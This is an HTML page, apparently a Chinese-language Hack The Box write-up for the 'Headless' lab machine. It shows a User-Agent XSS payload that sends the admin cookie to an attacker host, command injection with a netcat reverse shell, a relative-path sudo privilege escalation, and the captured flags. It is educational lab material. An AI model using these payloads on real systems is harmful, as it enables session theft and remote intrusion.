@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HTB Headless — 完整攻略</title>
+    <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600&family=Inter:wght@400;500;600;700&family=Noto+Sans+SC:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>:root{--bg:#0c0e12;--surface:#13161c;--surface-raised:#1a1e26;--border:#262b36;--text:#c8cdd6;--text-muted:#6b7280;--heading:#e8ecf2;--accent:#4ade80;--accent-dim:#166534;--red:#f87171;--amber:#fbbf24;--blue:#60a5fa;--purple:#c084fc;--cyan:#22d3ee;--code-bg:#0a0c10}*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Noto Sans SC','Inter',-apple-system,sans-serif;background:var(--bg);color:var(--text);line-height:1.7;-webkit-font-smoothing:antialiased}.hero{border-bottom:1px solid var(--border);padding:4rem 2rem 3rem;position:relative}.hero::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,var(--accent),var(--blue),var(--red))}.hero-inner{max-width:860px;margin:0 auto}.hero-label{font-family:'IBM Plex Mono',monospace;font-size:.75rem;letter-spacing:.12em;text-transform:uppercase;color:var(--accent);margin-bottom:1rem}.hero h1{font-size:2.8rem;font-weight:700;color:var(--heading);letter-spacing:-.03em}.hero h1 span{color:var(--accent)}.hero-meta{margin-top:1.2rem;display:flex;gap:2rem;flex-wrap:wrap;font-family:'IBM Plex Mono',monospace;font-size:.8rem;color:var(--text-muted)}.hero-meta strong{color:var(--text)}.chain{background:var(--surface);border-bottom:1px solid var(--border);padding:1.5rem 2rem;overflow-x:auto}.chain-inner{max-width:860px;margin:0 auto;display:flex;align-items:center;gap:0;white-space:nowrap;font-family:'IBM Plex Mono',monospace;font-size:.78rem}.chain-node{padding:.4rem .9rem;border-radius:4px;font-weight:500}.chain-node.green{background:var(--accent-dim);color:var(--accent)}.chain-node.blue{background:#1e3a5f;color:var(--blue)}.chain-node.red{background:#5f1e1e;color:var(--red)}.chain-arrow{color:var(--text-muted);padding:0 .5rem}.content{max-width:860px;margin:0 auto;padding:3rem 2rem 6rem}.phase{margin-top:3.5rem;margin-bottom:2rem;padding-bottom:.8rem;border-bottom:1px solid var(--border)}.phase:first-child{margin-top:0}.phase-number{font-family:'IBM Plex Mono',monospace;font-size:.7rem;letter-spacing:.15em;text-transform:uppercase;margin-bottom:.3rem}.phase-number.green{color:var(--accent)}.phase-number.blue{color:var(--blue)}.phase-number.red{color:var(--red)}.phase h2{font-size:1.6rem;font-weight:700;color:var(--heading)}h3{font-size:1.15rem;font-weight:600;color:var(--heading);margin-top:2.2rem;margin-bottom:.8rem}p{margin-bottom:1rem}pre{background:var(--code-bg);border:1px solid var(--border);border-radius:6px;padding:1.2rem 1.4rem;overflow-x:auto;margin:1rem 0 1.4rem;font-family:'IBM Plex Mono',monospace;font-size:.82rem;line-height:1.65;color:var(--text)}pre .comment{color:var(--text-muted)}pre .cmd{color:var(--accent)}pre .output{color:#8b949e}pre .highlight{color:var(--amber)}pre .important{color:var(--red)}code{font-family:'IBM Plex Mono',monospace;font-size:.88em;background:var(--surface-raised);padding:.15em .4em;border-radius:3px;color:var(--cyan)}pre code{background:none;padding:0;color:inherit}.callout{border-radius:6px;padding:1rem 1.2rem;margin:1.2rem 0;font-size:.92rem;line-height:1.6}.callout-why{background:#1a1e26;border-left:3px solid var(--blue)}.callout-why .callout-label{color:var(--blue)}.callout-key{background:#1a1220;border-left:3px solid var(--purple)}.callout-key .callout-label{color:var(--purple)}.callout-warn{background:#1e1a12;border-left:3px solid var(--amber)}.callout-warn .callout-label{color:var(--amber)}.callout-label{font-family:'IBM Plex Mono',monospace;font-size:.72rem;font-weight:600;letter-spacing:.1em;text-transform:uppercase;display:block;margin-bottom:.3rem}.takeaway{background:var(--surface);border:1px solid var(--border);border-radius:6px;padding:1.5rem;margin:2rem 0}.takeaway h3{margin-top:0}.takeaway-item{padding:.5rem 0;border-bottom:1px solid var(--border)}.takeaway-item:last-child{border-bottom:none}.takeaway-item strong{color:var(--heading)}.takeaway-item p{margin-bottom:0}.diagram{background:var(--surface);border:1px solid var(--border);border-radius:6px;padding:2rem;margin:1.5rem 0;text-align:center;font-family:'IBM Plex Mono',monospace;font-size:.82rem;line-height:2;color:var(--text);overflow-x:auto}.diagram .node{display:inline-block;padding:.3rem .8rem;border-radius:4px}.diagram .node-green{background:var(--accent-dim);color:var(--accent)}.diagram .node-blue{background:#1e3a5f;color:var(--blue)}.diagram .node-red{background:#5f1e1e;color:var(--red)}.diagram .arrow{color:var(--text-muted);margin:0 .3rem}.footer{text-align:center;padding:2rem;font-family:'IBM Plex Mono',monospace;font-size:.75rem;color:var(--text-muted);border-top:1px solid var(--border);margin-top:4rem}@media(max-width:640px){.hero h1{font-size:1.8rem}.content{padding:2rem 1rem 4rem}pre{font-size:.75rem;padding:1rem}}</style>
+</head>
+<body>
+<div id="gate" style="position:fixed;inset:0;z-index:9999;background:var(--bg);display:flex;align-items:center;justify-content:center;"><div style="text-align:center;font-family:'IBM Plex Mono',monospace;"><div style="font-size:2.4rem;margin-bottom:.3rem;">🗿</div><div style="font-size:.72rem;letter-spacing:.12em;text-transform:uppercase;color:var(--accent);margin-bottom:1.2rem;">HTB Writeup — Restricted</div><div style="color:var(--text-muted);font-size:.85rem;margin-bottom:1.5rem;max-width:320px;line-height:1.6;">This writeup contains spoilers for an HTB machine.<br>Enter the password to continue.</div><input id="gate-pw" type="password" placeholder="Password" autofocus style="background:var(--surface);border:1px solid var(--border);color:var(--heading);padding:.6rem 1rem;border-radius:4px;font-family:inherit;font-size:.9rem;width:220px;text-align:center;outline:none;" onkeydown="if(event.key==='Enter')checkPw()"><br><button onclick="checkPw()" style="margin-top:.8rem;background:var(--accent-dim);color:var(--accent);border:1px solid var(--accent);padding:.5rem 1.8rem;border-radius:4px;font-family:inherit;font-size:.82rem;cursor:pointer;">Enter</button><div id="gate-err" style="color:var(--red);font-size:.78rem;margin-top:.8rem;visibility:hidden;">Incorrect password</div><div style="color:var(--text-muted);font-size:.7rem;margin-top:2rem;opacity:.4;font-style:italic;direction:rtl;unicode-bidi:bidi-override;">Tessera est nomen machinae</div></div></div>
+<script>function checkPw(){if(document.getElementById('gate-pw').value==='headless'){document.getElementById('gate').style.display='none';sessionStorage.setItem('htb-auth-hl','1')}else{document.getElementById('gate-err').style.visibility='visible';document.getElementById('gate-pw').value=''}}if(sessionStorage.getItem('htb-auth-hl')==='1')document.getElementById('gate').style.display='none';</script>
+
+<header class="hero"><div class="hero-inner"><div class="hero-label">Hack The Box — 完整攻略</div><h1><span>Headless</span></h1><div class="hero-meta"><span>OS <strong>Linux</strong></span><span>难度 <strong>Easy</strong></span><span>端口 <strong>22 · 5000</strong></span><span>作者 <strong><a href="https://app.hackthebox.com/" style="color:var(--accent);text-decoration:none;">Nauhcnes</a></strong></span></div></div></header>
+
+<div class="chain"><div class="chain-inner"><span class="chain-node green">User-Agent XSS 绕过 WAF → 窃取 admin cookie → date 命令注入</span><span class="chain-arrow">→</span><span class="chain-node red">sudo syscheck 相对路径 initdb.sh 劫持 → root</span></div></div>
+
+<main class="content">
+
+<div class="phase"><div class="phase-number green">Phase 0</div><h2>信息收集</h2></div>
+<pre><code><span class="cmd">$ sudo nmap -sC -sV -p- 10.129.28.75 -T4</span>
+<span class="output">PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 9.2p1 Debian
+<span class="highlight">5000/tcp open  upnp?   Werkzeug/2.2.2 Python/3.11.2</span>
+|     Set-Cookie: is_admin=InVzZXIi...</span>
+
+<span class="cmd">$ gobuster dir --url http://10.129.28.75:5000/ -w /usr/share/wordlists/dirb/common.txt</span>
+<span class="output">/dashboard  (Status: 500)  ← 需要 admin cookie
+<span class="highlight">/support</span>    (Status: 200)  ← 联系表单</span></code></pre>
+
+
+<div class="phase"><div class="phase-number green">Phase 1</div><h2>立足点：XSS 窃取 Cookie → 命令注入</h2></div>
+
+<h3>User-Agent XSS 绕过 WAF</h3>
+
+<div class="callout callout-key">
+<span class="callout-label">🧒 儿童版 — WAF 只查表单不查 Header</span>
+网站有个"举报黑客"功能——你提交恶意内容，它会弹出警告页面并把你的请求信息发给管理员审查。WAF 检查了表单内容，但没检查 User-Agent。我们在 User-Agent 里藏 XSS 代码，表单里故意触发 WAF。管理员打开举报页面时，User-Agent 里的代码就执行了——cookie 就被偷走了。
+</div>
+
+<pre><code><span class="comment"># Burp 拦截 /support POST，修改 User-Agent：</span>
+<span class="cmd">User-Agent: &lt;script&gt;var i=new Image(); i.src="http://10.10.14.73:5000/?cookie="+btoa(document.cookie);&lt;/script&gt;</span>
+<span class="comment"># message 字段保留 &lt;script&gt;alert(1)&lt;/script&gt; 触发 WAF</span>
+
+<span class="comment"># 攻击机监听收到：</span>
+<span class="output">GET /?cookie=<span class="highlight">aXNfYWRtaW49SW1Ga2JXbHVJZy5kbXpEa1pORW02Q0swb3lMMWZiTS1TblhwSDA=</span></span></code></pre>
+
+<h3>Admin Dashboard 命令注入</h3>
+<p>用窃取的 cookie 访问 <code>/dashboard</code>，"Generate Report" 的 <code>date</code> 参数存在命令注入：</p>
+<pre><code><span class="cmd">date=2023-09-15;id</span>
+<span class="output"><span class="highlight">uid=1000(dvir) gid=1000(dvir)</span></span>
+
+<span class="comment"># 反弹 shell（+ 代替空格）</span>
+<span class="cmd">date=2023-09-15;nc+10.10.14.73+4444+-e+/bin/bash</span>
+
+<span class="cmd">$ nc -lvnp 4444</span>
+<span class="output">dvir@headless:~$</span>
+
+<span class="cmd">dvir@headless:~$ cat user.txt</span>
+<span class="output">f1b4ec9b1f066952afe5cf69e0f0d97b</span></code></pre>
+
+
+<div class="phase"><div class="phase-number red">Phase 2</div><h2>权限提升：syscheck 相对路径劫持</h2></div>
+
+<pre><code><span class="cmd">dvir@headless:~$ sudo -l</span>
+<span class="output">(ALL) NOPASSWD: <span class="highlight">/usr/bin/syscheck</span></span></code></pre>
+
+<pre><code><span class="comment"># syscheck 脚本关键部分：</span>
+<span class="output">if ! /usr/bin/pgrep -x "initdb.sh" &>/dev/null; then
+  /usr/bin/echo "Database service is not running. Starting it..."
+  <span class="important">./initdb.sh</span> 2>/dev/null    ← 相对路径！
+fi</span></code></pre>
+
+<div class="callout callout-key">
+<span class="callout-label">🧒 儿童版 — 在当前目录放假脚本</span>
+syscheck 脚本里写了"启动 <code>./initdb.sh</code>"——注意 <code>./</code>，意思是"在<strong>当前所在的文件夹</strong>里找"。我们跑到 <code>/tmp</code>，在那里放一个假的 <code>initdb.sh</code>（里面写着"给我开 bash"），然后从 <code>/tmp</code> 运行 syscheck。root 就会执行我们的假脚本。
+</div>
+
+<pre><code><span class="cmd">dvir@headless:~$ cd /tmp</span>
+<span class="cmd">dvir@headless:/tmp$ echo -e '#!/bin/bash\n/bin/bash' > initdb.sh</span>
+<span class="cmd">dvir@headless:/tmp$ chmod +x initdb.sh</span>
+<span class="cmd">dvir@headless:/tmp$ sudo /usr/bin/syscheck</span>
+
+<span class="cmd">root@headless:/tmp# cat /root/root.txt</span>
+<span class="output">257fe01d8b31f90e0b425709cc4e17c9</span></code></pre>
+
+
+<div class="phase"><div class="phase-number" style="color:var(--purple);">附录</div><h2>知识点总结</h2></div>
+
+<div class="takeaway">
+<div class="takeaway-item"><strong>XSS 绕过 WAF：把 payload 放在 HTTP Header 里。</strong><p>当表单字段被过滤时，尝试 User-Agent、Referer、Cookie。如果应用会展示这些 Header 的内容，XSS 就能触发。</p></div>
+<div class="takeaway-item"><strong>HTTP 表单编码中空格 = <code>+</code>。</strong><p><code>application/x-www-form-urlencoded</code> 格式中空格编码为 <code>+</code>。在 Burp 中注入命令时需注意。</p></div>
+<div class="takeaway-item"><strong>相对路径提权。</strong><p>脚本用 <code>./script.sh</code> 而非绝对路径调用时，可以在当前目录创建同名恶意文件来劫持执行。关键是要从<strong>你控制的目录</strong>运行 sudo 命令。</p></div>
+</div>
+
+<div class="diagram"><span class="node node-green">UA XSS → cookie 窃取</span><span class="arrow">→</span><span class="node node-green">date 命令注入</span><span class="arrow">→</span><span class="node node-red">./initdb.sh 相对路径 → root</span></div>
+
+</main>
+<footer class="footer"><a href="https://app.hackthebox.com/" style="color:var(--accent);text-decoration:none;">Nauhcnes</a> · HTB Headless Writeup · 2026</footer>
+</body></html>
